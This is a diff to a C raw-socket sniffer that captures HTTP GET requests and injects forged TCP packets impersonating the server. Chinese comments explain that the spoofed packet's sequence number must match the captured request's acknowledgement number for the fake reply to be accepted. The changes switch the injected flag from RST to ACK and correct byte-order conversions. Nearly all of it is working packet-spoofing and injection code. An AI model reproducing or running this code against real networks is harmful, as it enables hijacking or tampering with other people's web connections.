@@ -16,6 +16,7 @@
 #include <string.h>       /* String operations             */ 
 #include <stdlib.h>       /* Standard library definitions  */ 
 #include <errno.h>
+#include <glib.h>
 
 #define TCPSYN_LEN 20
 #define MAXBYTES2CAPTURE 2048
@@ -198,15 +199,22 @@ while(1){
 	  }
 	}
   if(cmp1==1){
-    //printf("+--------------------------------------+\n");
+      printf("+--------------------------------------+\n");
       //printf("%s",payload);
       //payload="";
       //printf("th_seq outer fake_sender:%d\n",tcp->th_seq);
       //pretend be server,and send RST to source client fack server
-Fake_send(tcp->th_seq, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
+      printf("得到一个GET请求，将得到请求的ack序号，放到发送的假包的seq里即可应答成功\n");
+      printf("tcpdump的时候记得加上绝对号，-S输出\n");
+      printf("   ACK: %u\n", g_ntohl(tcp->th_ack) );
+      printf("   SEQ: %u\n", g_ntohl(tcp->th_seq) );
+      printf("   SRC PORT: %d\n", ntohs(tcp->th_sport) );
+      printf("   DST PORT: %d\n", ntohs(tcp->th_dport) );
+
+      Fake_send(tcp->th_ack, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
       //preten be client, and sent RST to server....fack client
       //TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
-    //printf("\n+-------------------------+\n");
+      printf("\n+-------------------------+\n");
   }
  
  	//iphdr = (struct ip *)(packet+14);
@@ -218,10 +226,10 @@ Fake_send(tcp->th_seq, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp-
  		printf("Received Packet No.%d:\n", ++count);
  	*/	
 
- printf("   ACK: %u\n", ntohs(tcp->th_ack) ); 
- printf("   SEQ: %u\n", ntohs(tcp->th_seq) );
-    // printf("   SRC PORT: %d\n", ntohs(tcphdr->th_sport) ); 
-      //printf("   DST PORT: %d\n", ntohs(tcphdr->th_dport) ); 
+ //printf("   ACK: %u\n", g_ntohl(tcp->th_ack) ); 
+ //printf("   SEQ: %u\n", g_ntohl(tcp->th_seq) );
+ //printf("   SRC PORT: %d\n", ntohs(tcp->th_sport) ); 
+ //printf("   DST PORT: %d\n", ntohs(tcp->th_dport) ); 
 
 
 
@@ -316,22 +324,23 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   ipheader->ip_tos = 0;    /* Type of Service (Usually zero)                 */
   
   //加了包大小计算的地方之一
-  ipheader->ip_len = htons( sizeof (struct ip) + sizeof (struct tcphdr)+ payload_len+1 );         
+  ipheader->ip_len = g_htons( sizeof (struct ip) + sizeof (struct tcphdr)+ payload_len+1 );         
   ipheader->ip_off = 0;    /* Fragment offset. We'll not use this            */
   ipheader->ip_ttl = 64;   /* Time to live: 64 in Linux, 128 in Windows...   */
   ipheader->ip_p = 6;      /* Transport layer prot. TCP=6, UDP=17, ICMP=1... */
   ipheader->ip_sum = 0;    /* Checksum. It has to be zero for the moment     */
-  ipheader->ip_id = htons( 1337 ); 
+  ipheader->ip_id = g_htons( 1337 ); 
   ipheader->ip_src.s_addr = src_ip;  /* Source IP address                    */
   ipheader->ip_dst.s_addr = dst_ip;  /* Destination IP address               */
 
-  /* TCP Header */   
+  /* TCP Header */
+  /*这里的应答包构建时的seq号，必须是得到GET /请求的ack号（期望号）另外tcpdump观察包是否正确时，记得加上-S选项*/
   tcpheader->th_seq = seq;        /* Sequence Number                         */
-  tcpheader->th_ack = htonl(1);   /* Acknowledgement Number                  */
+  tcpheader->th_ack = g_htonl(1);   /* Acknowledgement Number                  */
   tcpheader->th_x2 = 0;           /* Variable in 4 byte blocks. (Deprecated) */
   tcpheader->th_off = 5;      /* Segment offset (Lenght of the header)   */
   tcpheader->th_flags = TH_ACK;   /* 原来这里设置成了RST，我们不能这么干        */
-  tcpheader->th_win = htons(4500) + rand()%1000;/* Window size               */
+  tcpheader->th_win = g_htons(4500) + rand()%1000;/* Window size               */
   tcpheader->th_urp = 0;          /* Urgent pointer.                         */
   tcpheader->th_sport = src_prt;  /* Source Port                             */
   tcpheader->th_dport = dst_prt;  /* Destination Port                        */
@@ -343,7 +352,7 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   pseudohdr.zero = 0;
   pseudohdr.protocol = ipheader->ip_p;
   //加了包大小的地方之一
-  pseudohdr.tcplen = htons(sizeof(struct tcphdr));
+  pseudohdr.tcplen = g_htons(sizeof(struct tcphdr));
 
   /* Copy header and pseudoheader to a buffer to compute the checksum */  
   memcpy(tcpcsumblock, &pseudohdr, sizeof(tcp_phdr_t));   
@@ -378,7 +387,7 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
 
 
   /* Send it through the raw socket */    
-  if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,(struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){   
+  if ( sendto(rawsocket, packet, g_ntohs(ipheader->ip_len), 0,(struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){   
        //Socket error:90:Message Too Long 
       printf("Socket Sendto error %d : %s\n", errno, strerror(errno));  
       return -1;
@@ -387,8 +396,8 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   printf("Sent RST Packet:\n");
   printf("   SRC: %d \n", ipheader->ip_src);
   printf("   DST: %d \n", ipheader->ip_dst);
-  printf("   Seq=%u\n", ntohs(tcpheader->th_seq));
-  printf("   Ack=%u\n", ntohs(tcpheader->th_ack));
+  printf("   Seq=%u\n", g_ntohl(tcpheader->th_seq));
+  printf("   Ack=%u\n", g_ntohl(tcpheader->th_ack));
   printf("   TCPsum: %02x\n",  tcpheader->th_sum);
   printf("   IPsum: %02x\n", ipheader->ip_sum);
     
